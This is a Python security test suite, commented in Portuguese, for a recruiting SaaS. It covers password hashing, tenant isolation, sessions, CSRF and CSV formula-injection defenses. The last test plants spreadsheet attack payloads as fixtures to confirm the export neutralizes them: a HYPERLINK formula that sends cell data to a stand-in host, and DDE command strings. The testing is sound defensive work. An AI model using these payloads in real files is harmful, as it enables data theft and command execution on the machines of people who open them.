"""Senha, sessão, CSRF e — o que mais importa num SaaS — isolamento entre contas."""
from __future__ import annotations

from .comum import Placar


def rodar(placar: Placar) -> None:
    from app import extraction, security, storage

    print("\nSegurança")
    storage.iniciar()

    # ---- senha ----
    def senha():
        guardado = security.hash_senha("uma frase bem longa de senha")
        assert guardado.startswith("pbkdf2_sha256$"), guardado[:30]
        assert "uma frase" not in guardado, "a senha vazou dentro do hash"
        assert security.conferir_senha("uma frase bem longa de senha", guardado)
        assert not security.conferir_senha("uma frase bem longa de senh", guardado)
        assert not security.conferir_senha("", guardado)
        assert not security.conferir_senha("qualquer", "lixo-que-nao-e-hash")

        outro = security.hash_senha("uma frase bem longa de senha")
        assert outro != guardado, "sem sal: duas senhas iguais geraram o mesmo hash"
        return "PBKDF2 com sal por senha"

    placar.rodar("Senha é guardada como hash com sal", senha)

    def senha_fraca():
        assert security.criticar_senha("curta") is not None
        assert security.criticar_senha("aaaaaaaaaaaaaa") is not None
        assert security.criticar_senha("senha123456") is not None
        assert security.criticar_senha("cafe com pao na chuva") is None
        return "curta, repetitiva e óbvia são recusadas"

    placar.rodar("Senha fraca é recusada no cadastro", senha_fraca)

    # ---- isolamento entre organizações ----
    def isolamento():
        org_a = storage.criar_organizacao("Empresa A")
        org_b = storage.criar_organizacao("Empresa B")
        u_a = storage.criar_usuario(org_a, "a@teste.com", "A", "h", "admin")
        u_b = storage.criar_usuario(org_b, "b@teste.com", "B", "h", "admin")

        # O mesmo currículo, enviado pelas duas empresas.
        doc = extraction.Documento(candidato_id="compartilhado01", arquivo="cv.pdf",
                                   texto="texto do curriculo", origem_hash="abc123")
        assert storage.salvar_curriculo(org_a, doc) is True
        assert storage.salvar_curriculo(org_b, doc) is True, (
            "a segunda empresa herdou o registro da primeira"
        )

        storage.salvar_parse(org_a, doc.candidato_id, {"identificacao": {"nome": "Só de A"}})
        parse_b = storage.buscar_curriculo(org_b, doc.candidato_id)["parse"]
        assert parse_b is None, "o parse de uma empresa apareceu na outra"

        vaga_a = storage.criar_vaga(org_a, "Vaga da A", "descrição", u_a)
        assert storage.buscar_vaga(org_a, vaga_a) is not None
        assert storage.buscar_vaga(org_b, vaga_a) is None, (
            "a empresa B enxergou a vaga da empresa A"
        )
        assert storage.contar_curriculos_da_vaga(org_b, vaga_a) == 0

        storage.apagar_candidato(org_a, doc.candidato_id)
        assert storage.buscar_curriculo(org_b, doc.candidato_id) is not None, (
            "apagar na empresa A apagou o registro da empresa B"
        )
        storage.criar_vaga(org_b, "Vaga da B", "descrição", u_b)
        return "cada conta só enxerga o que é dela"

    placar.rodar("Uma organização não alcança dados de outra", isolamento)

    # ---- sessão ----
    def sessao():
        org = storage.criar_organizacao("Empresa C")
        usuario = storage.criar_usuario(org, "c@teste.com", "C", "h", "recrutador")
        token = security.novo_token()
        storage.criar_sessao(usuario, security.hash_token(token), "csrf-abc", horas=1)

        achada = storage.buscar_sessao(security.hash_token(token))
        assert achada and achada["org_id"] == org
        assert storage.buscar_sessao(security.hash_token("token-inventado")) is None

        # Sessão vencida some sozinha na primeira consulta.
        vencido = security.novo_token()
        storage.criar_sessao(usuario, security.hash_token(vencido), "x", horas=-1)
        assert storage.buscar_sessao(security.hash_token(vencido)) is None

        storage.encerrar_sessoes_do_usuario(usuario)
        assert storage.buscar_sessao(security.hash_token(token)) is None
        return "token guardado só como hash; expiração respeitada"

    placar.rodar("Sessão vence, é revogável e não guarda o token", sessao)

    # ---- freio de força bruta ----
    def forca_bruta():
        chave = "alvo@teste.com|10.0.0.1"
        for _ in range(5):
            storage.registrar_tentativa(chave)
        assert storage.contar_tentativas(chave, 15) == 5
        assert storage.contar_tentativas("outro@teste.com|10.0.0.1", 15) == 0
        storage.limpar_tentativas(chave)
        assert storage.contar_tentativas(chave, 15) == 0
        return "tentativas contadas por e-mail e IP"

    placar.rodar("Tentativas de login são contadas e zeram no acerto", forca_bruta)

    # ---- camada HTTP ----
    def http():
        from fastapi.testclient import TestClient
        from app.main import app

        with TestClient(app) as cliente:
            resp = cliente.post("/api/auth/registrar", json={
                "organizacao": "Empresa HTTP", "nome": "Fulano",
                "email": "fulano@empresahttp.com", "senha": "cafe com pao na chuva",
            })
            assert resp.status_code == 201, f"{resp.status_code}: {resp.text[:200]}"
            assert cliente.cookies.get("triagem_sessao"), "não veio cookie de sessão"
            csrf = cliente.cookies.get("triagem_csrf")
            assert csrf, "não veio cookie de CSRF"

            assert cliente.get("/api/auth/eu").status_code == 200

            # Sem o cabeçalho anti-CSRF, ação de escrita é recusada.
            sem_csrf = cliente.post("/api/vagas", json={
                "titulo": "Vaga", "descricao": "descrição longa o suficiente " * 3,
            }, headers={"x-csrf-token": ""})
            assert sem_csrf.status_code == 403, (
                f"requisição sem token CSRF passou ({sem_csrf.status_code})"
            )

            # Com token errado, também.
            errado = cliente.post("/api/vagas", json={
                "titulo": "Vaga", "descricao": "descrição longa o suficiente " * 3,
            }, headers={"x-csrf-token": "token-de-outro-lugar"})
            assert errado.status_code == 403, f"token CSRF falso passou ({errado.status_code})"

            # Senha fraca é barrada na criação de conta.
            fraca = cliente.post("/api/auth/registrar", json={
                "organizacao": "Empresa Fraca", "nome": "Beltrano",
                "email": "beltrano@fraca.com", "senha": "123",
            })
            assert fraca.status_code == 400, f"{fraca.status_code}: {fraca.text[:200]}"

            # E-mail malformado vira mensagem legível, não a lista crua do Pydantic.
            invalido = cliente.post("/api/auth/registrar", json={
                "organizacao": "Empresa", "nome": "Sicrano",
                "email": "nao-e-email", "senha": "cafe com pao na chuva",
            })
            assert invalido.status_code == 422, invalido.status_code
            detalhe = invalido.json()["detail"]
            assert isinstance(detalhe, str), f"o 422 voltou como {type(detalhe)}, não como frase"
            assert "e-mail" in detalhe, detalhe

            # E-mail repetido não cria segunda conta.
            repetido = cliente.post("/api/auth/registrar", json={
                "organizacao": "Outra", "nome": "Fulano",
                "email": "fulano@empresahttp.com", "senha": "cafe com pao na chuva",
            })
            assert repetido.status_code == 409, repetido.status_code

            # Login com senha errada não entra.
            ruim = cliente.post("/api/auth/login", json={
                "email": "fulano@empresahttp.com", "senha": "senha errada mesmo",
            })
            assert ruim.status_code == 401, ruim.status_code

            cabecalhos = {"x-csrf-token": cliente.cookies.get("triagem_csrf") or ""}
            assert cliente.post("/api/auth/logout", headers=cabecalhos).status_code == 200
            assert cliente.get("/api/auth/eu").status_code == 401, "logout não encerrou a sessão"

            saude = cliente.get("/api/saude")
            assert saude.status_code == 200 and saude.json()["banco"] == "ok"
            assert saude.headers.get("x-content-type-options") == "nosniff"
            assert "content-security-policy" in saude.headers
            assert saude.headers.get("cache-control") == "no-store"
        return "CSRF, login, logout e cabeçalhos de segurança"

    placar.rodar("A camada HTTP exige sessão e token anti-CSRF", http)

    # ---- CSV que o recrutador abre no Excel ----
    def formula_injection_no_csv():
        """Achado da Lupa. Excel e LibreOffice executam célula que começa com
        `=`, `+`, `-`, `@`, tab ou CR. O nome vem do currículo e a anotação vem
        do teclado do recrutador: texto de fora virando fórmula na máquina de
        quem abre o arquivo — e `=HYPERLINK` exfiltra o conteúdo junto."""
        import asyncio
        import csv as csv_mod
        import io as io_mod

        from starlette.requests import Request

        from app.models import Rubrica
        from app.rotas_vagas import exportar_csv

        org = storage.criar_organizacao("Empresa Planilha")
        chefe = storage.criar_usuario(org, "chefe@planilha.com", "Chefe",
                                      "hash-falso", "admin")
        vaga = storage.criar_vaga(org, "Analista", "descrição da vaga " * 10, chefe)
        rubrica = Rubrica(cargo="Analista", senioridade="pleno", criterios=[
            {"id": "sup", "nome": "=CMD()|'/C calc'!A0", "descricao": "d", "peso": 100},
        ])
        storage.salvar_rubrica(org, vaga, rubrica.model_dump(), aprovada=True)

        ataque = '=HYPERLINK("http://malicioso.example/?"&A1,"clique")'
        doc = extraction.Documento(
            candidato_id="cand000000000777", arquivo="=cv_malicioso.pdf",
            texto="texto qualquer do currículo",
        )
        storage.salvar_curriculo(org, doc)
        storage.salvar_parse(org, doc.candidato_id, {
            "identificacao": {"nome": ataque, "email": "+55@x.com",
                              "telefone": "+55 11 90000-0000"},
        })
        storage.vincular(vaga, doc.candidato_id)
        storage.salvar_avaliacao(vaga, doc.candidato_id, estagio="avaliado",
                                 score_final=88.0, recomendacao="chamar")
        storage.salvar_decisao(vaga, doc.candidato_id, "entrevistar",
                               "-2+3+cmd|' /C calc'!A0", chefe)

        requisicao = Request({"type": "http", "method": "GET", "path": "/",
                              "query_string": b"", "headers": [],
                              "client": ("127.0.0.1", 0)})

        async def baixar() -> bytes:
            resp = await exportar_csv(vaga, requisicao,
                                      {"org_id": org, "usuario_id": chefe})
            return b"".join([p async for p in resp.body_iterator])

        texto = asyncio.run(baixar()).decode("utf-8-sig")
        tabela = list(csv_mod.reader(io_mod.StringIO(texto), delimiter=";"))
        cabecalho, linha = tabela[0], tabela[1]

        perigosos = ("=", "+", "-", "@", "\t", "\r", "\n")
        for celula in (*cabecalho, *linha):
            assert not celula.startswith(perigosos), (
                f"célula sai como fórmula para quem abrir no Excel: {celula!r}"
            )

        # A trava é a aspa, e o conteúdo tem de continuar legível — neutralizar
        # apagando o dado seria outro defeito.
        nome = linha[cabecalho.index("Nome")]
        assert nome == f"'{ataque}", nome
        assert "malicioso.example" in nome, "o dado do candidato foi perdido"

        # E o que é número continua número: prefixar quebraria a soma na planilha.
        assert linha[cabecalho.index("Score")] == "88.0", linha[cabecalho.index("Score")]
        return "nome, anotação, arquivo, contato e nome de critério neutralizados"

    placar.rodar("CSV exportado não vira fórmula executável no Excel",
                 formula_injection_no_csv)
